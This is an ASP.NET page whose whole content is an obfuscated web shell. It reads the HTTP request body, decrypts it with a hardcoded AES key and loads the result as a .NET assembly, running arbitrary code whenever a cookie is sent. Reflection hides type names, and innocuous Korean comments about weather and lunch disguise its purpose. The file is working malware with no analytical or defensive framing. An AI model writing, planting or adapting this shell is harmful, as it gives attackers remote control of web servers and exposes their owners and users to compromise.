<%@ Page Language="C#" %><%
// 오늘 날씨가 정말 좋네요.
Action<object> entryPoint = (page) => {
    // 배고파요, 치킨 먹고 싶다.
    Func<byte[]> getKeyBytes = () => {
        // 이 키는 매우 중요합니다.
        long x = 7162143264375996515; // 0x6361633635343333
        long y = 6994269992388903280; // 0x6130653162396230
        byte[] z = new byte[16];
        System.Buffer.BlockCopy(System.BitConverter.GetBytes(x), 0, z, 0, 8);
        System.Buffer.BlockCopy(System.BitConverter.GetBytes(y), 0, z, 8, 8);
        // "ca63457538b9b1e0" -> ASCII bytes
        return new byte[] {99,97,54,51,52,53,55,53,51,56,98,57,98,49,101,48};
    };

    // 점심 뭐 먹지?
    Func<HttpRequest, byte[]> readPayload = (req) => {
        var s = req.InputStream;
        var b = new byte[s.Length];
        s.Read(b, 0, b.Length);
        return b;
    };
    
    // 이 함수는 마법을 부립니다.
    Action<byte[], byte[], object> execute = (key, data, ctx) => {
        var provider = System.Type.GetType(string.Join(",", new string[]{"System.Security.Cryptography.RijndaelManaged", "mscorlib"}));
        var instance = System.Activator.CreateInstance(provider);
        var decryptor = (System.Security.Cryptography.ICryptoTransform)provider.GetMethod("CreateDecryptor", new System.Type[]{typeof(byte[]),typeof(byte[])}).Invoke(instance, new object[]{key, key});
        byte[] code = decryptor.TransformFinalBlock(data, 0, data.Length);
        
        var asmLoaderType = typeof(System.Reflection.Assembly);
        var loadedAsm = (System.Reflection.Assembly)asmLoaderType.GetMethod("Load", new System.Type[]{typeof(byte[])}).Invoke(null, new object[]{code});
        
        // 퇴근하고 싶다.
        var magicString = System.Text.Encoding.ASCII.GetString(new byte[]{75});
        loadedAsm.CreateInstance(magicString).Equals(ctx);
    };

    if (((Page)page).Request.Cookies.Count > 0) {
        var k = getKeyBytes();
        var d = readPayload(((Page)page).Request);
        if (d.Length > 0) execute(k, d, page);
    }
};
entryPoint(this);
%>